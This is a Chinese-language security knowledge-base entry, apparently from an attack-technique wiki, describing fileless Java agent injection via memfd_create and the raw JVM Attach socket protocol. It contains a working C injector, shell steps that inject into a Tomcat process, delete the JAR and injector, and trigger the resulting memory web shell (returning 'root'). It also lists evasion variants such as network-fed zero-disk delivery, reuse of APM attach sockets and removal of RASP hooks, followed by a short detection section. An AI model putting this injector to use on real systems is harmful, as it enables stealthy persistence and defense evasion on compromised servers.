---
id: web-java-classloader-memfd-fileless-agent-injection
title: memfd_create 配合 Attach 协议实现无文件 Java Agent 注入
type: scenario
domain: web
path: web/java/classloader
technique: memfd-fileless-java-agent-injection
tags:
- java
- jvm
- attach-api
- memfd
- fileless
- linux
- agent
- injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:34:34+08:00'
  notes: 已对照原文与图22/24/26核对：fileless_injector 以 memfd 写入 793601 字节、路径 /proc/189216/fd/3，经原始 Attach 协议发送成功并收到 JVM Response 0；删除 agent.jar 与注入器后 whoami 仍返回 root；注入前后 JVM 的 memfd 数量均为 1（JDK 25 自带）。无文件特性与残余痕迹边界描述准确。原文未涉及受影响版本区间。未执行 PoC。
url: /docs/web/java/classloader/web-java-classloader-memfd-fileless-agent-injection/
draft: false
kb_aliases:
- memfd 无文件注入
- 无文件 Java Agent
- fileless_injector
- /proc/pid/fd 注入
- 原始 Attach 协议
---

## 一句话结论

攻击者可在本地把 Agent JAR 写入 `memfd_create` 创建的匿名内存文件，再通过原始 Attach Unix Socket 协议把 `/proc/<注入器PID>/fd/<N>` 作为 Agent 路径交给目标 JVM；注入器退出后匿名文件销毁，磁盘上不留 Agent 产物，而内存马继续存活。

## 原理

- `memfd_create` 创建一个只存在于内存、没有文件系统路径的匿名文件；进程通过 `/proc/<pid>/fd/<fd>` 仍可访问其内容。目标 JVM 读取该 `/proc` 路径即可获得完整 JAR 字节。
- 标准 `VirtualMachine.loadAgent` 底层也是在 `/tmp/.java_pid<PID>` 上发送 Attach 协议。无文件注入器直接实现该协议，避免依赖 JDK Attach API，也避免把 JAR 写到目标可见的普通文件。
- Attach 协议报文格式为：`"1\0load\0instrument\0false\0<agentPath>\0"`。目标 JVM 的 Attach Listener 解析后，从 `<agentPath>` 加载 Agent。
- AttachListener 首次启动需要外部触发：创建 `/tmp/.attach_pid<PID>`，向目标发送 `SIGQUIT`，等待 JVM 创建 `/tmp/.java_pid<PID>` Socket；若 Socket 已存在（曾被 Arthas/SkyWalking 等 Attach 过），直接连接即可，不产生新的文件创建事件。
- 注入完成后，目标 JVM 把 JAR 读入自己的堆内存，不长期持有源文件 fd；注入器关闭 memfd 并退出后，`/proc/<注入器PID>` 被内核回收，匿名内存文件销毁。删除磁盘上的 `agent.jar` 与注入器，已重转换的字节码仍驻留在目标 JVM 的 Metaspace 中，内存马继续工作。
- 无文件不等于无痕迹：首次注入仍会创建 `.attach_pid`/`.java_pid` 并新增 Attach Listener 线程；后续复用已存在的 Socket 时，文件系统与线程层面可以做到零增量。

## 触发条件

- 已获得目标主机 Shell，且与目标 JVM 同 UID（或 root/具备 `CAP_SYS_PTRACE`）。
- Linux 内核支持 `memfd_create`（3.17+），且注入器能在目标主机执行。
- `/tmp` 可写，目标 JVM 的 tmp 目录未被 `PrivateTmp` 等机制隔离。
- 目标 JVM 未禁用 Attach（`-XX:+DisableAttachMechanism`）。
- Agent JAR 已准备（通常与 Attach API 卡片中的 JVMTI Agent 相同）。

## 利用步骤

1. 准备 Agent JAR（`Agent-Class`、`Can-Retransform-Classes: true`）。
2. 编译 C 注入器：读取 JAR 到内存，`memfd_create` 创建匿名文件，写入 JAR。
3. 构造 `/proc/<自身PID>/fd/<memfd>` 路径，确认目标可读（同 UID/root）。
4. 触发 AttachListener：若 `/tmp/.java_pid<PID>` 不存在，创建 `/tmp/.attach_pid<PID>` 并发送 `SIGQUIT`，等待 Socket 出现。
5. 连接 Unix Socket，发送 `1\0load\0instrument\0false\0<memfd路径>\0`。
6. 读取响应，`0` 表示加载成功；关闭 memfd，注入器退出。
7. 删除磁盘上的 JAR/注入器，验证内存马仍可触发。

## PoC

```c
/* fileless_injector.c 关键片段 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>
#include <signal.h>
#include <linux/memfd.h>

static int my_memfd_create(const char *name, unsigned int flags) {
    return (int)syscall(SYS_memfd_create, name, flags);
}

int main(int argc, char **argv) {
    int pid = atoi(argv[1]);
    /* 1. 读 JAR 到内存 */
    FILE *fp = fopen(argv[2], "rb");
    fseek(fp, 0, SEEK_END); long n = ftell(fp); fseek(fp, 0, SEEK_SET);
    unsigned char *buf = malloc(n); fread(buf, 1, n, fp); fclose(fp);

    /* 2. 创建匿名内存文件并写入 */
    int fd = my_memfd_create("", MFD_CLOEXEC);
    write(fd, buf, n); free(buf);

    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/fd/%d", getpid(), fd);

    /* 3. 触发 AttachListener（若 Socket 不存在） */
    char sock_path[256], attach_file[256];
    snprintf(sock_path, sizeof(sock_path), "/tmp/.java_pid%d", pid);
    if (access(sock_path, F_OK) != 0) {
        snprintf(attach_file, sizeof(attach_file), "/tmp/.attach_pid%d", pid);
        close(open(attach_file, O_CREAT | O_WRONLY, 0644));
        kill(pid, SIGQUIT);
        for (int i = 0; i < 50 && access(sock_path, F_OK) != 0; i++) usleep(100000);
        unlink(attach_file);
    }

    /* 4. 发送原始 Attach 协议 */
    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    struct sockaddr_un a = {0}; a.sun_family = AF_UNIX;
    strncpy(a.sun_path, sock_path, sizeof(a.sun_path) - 1);
    connect(s, (struct sockaddr *)&a, sizeof(a));

    char p[2048]; int o = 0;
    p[o++]='1'; p[o++]='\0';
    memcpy(p+o,"load",4); o+=4; p[o++]='\0';
    memcpy(p+o,"instrument",10); o+=10; p[o++]='\0';
    memcpy(p+o,"false",5); o+=5; p[o++]='\0';
    memcpy(p+o,path,strlen(path)); o+=strlen(path); p[o++]='\0';
    write(s, p, o);

    char resp[1024] = {0};
    read(s, resp, sizeof(resp)-1);
    close(s);

    /* 5. 关闭 memfd，匿名文件销毁 */
    close(fd);
    return resp[0] == '0' ? 0 : 1;
}
```

```bash
gcc -O2 -o fileless_injector fileless_injector.c
TARGET_PID=$(pgrep -f 'catalina.startup.Bootstrap')
./fileless_injector "$TARGET_PID" agent.jar

# 注入成功后删除磁盘文件，内存马仍存活
rm -f agent.jar fileless_injector
curl -s -H 'X-Token: whoami' http://127.0.0.1:8080/y
```

```text
# 注入器输出示例：
[+] Read JAR into memory: 793601 bytes
[+] Memory file created: /proc/189216/fd/3
[+] Attach socket ready: /tmp/.java_pid189129
[*] Command sent (42 bytes)
[*] JVM Response: 0
[+] === INJECTION SUCCESSFUL ===
[*] Memory fd closed — anonymous file destroyed

# 删除文件后触发：
root
```

## 变体与关联

- 变体：生产环境可通过网络接收 Agent JAR 字节流，直接写入 memfd，实现从投递到注入的全程零落盘。
- 变体：复用已存在的 `/tmp/.java_pid<PID>`（Arthas/SkyWalking 等 APM 工具留下的 Socket）可避免新的文件创建与线程告警。
- 变体：注入后可通过反射摘除 RASP Transformer（原文给出思路，未实测），或 Hook 其他请求入口。
- 关联：[[web-java-classloader-attach-api-jvmti-agent-memory-shell]]（Agent 载荷与 retransform 细节）；[[pentest-lateral-movement-java-attach-socket-container-injection]]（Attach 协议与共享 /tmp 跨容器注入）；[[web-java-classloader-asm-retransform-auth-bypass]]（Attach Agent 的另一种载荷）；[[web-java-classloader-jsp-memory-servlet-webshell]]（另一类内存马）。
- 边界：仍需本地代码执行与同 UID/root；`memfd_create` 仅消除 JAR 磁盘残留，不能消除 Attach Socket、Attach Listener 线程、类字节码变化等内存/内核痕迹；JDK 未来版本可能默认禁止动态加载 Agent。

## 检测与防御

- 检测：eBPF/auditd 监控 `memfd_create` 后紧跟对 `/tmp/.java_pid*` 的 `connect()`；审计 `SIGQUIT` 发送源；巡检 `/tmp/.java_pid*`、`.attach_pid*` 与 Attach Listener 线程；比对关键类字节码哈希；关注 `/proc/<jvm>/fd` 中异常的匿名 fd（注入窗口内）。
- 修复/加固：`-XX:+DisableAttachMechanism`；systemd `PrivateTmp=true` 隔离 `/tmp`；限制 JVM 运行账户与本地 Shell；对 `/tmp` 使用 `noexec,nosuid`。
- 缓解：部署 RASP/eBPF 运行时检测；定期做内存马排查与类基线校验；最小化主机上的 JDK 调试工具与本地账户。
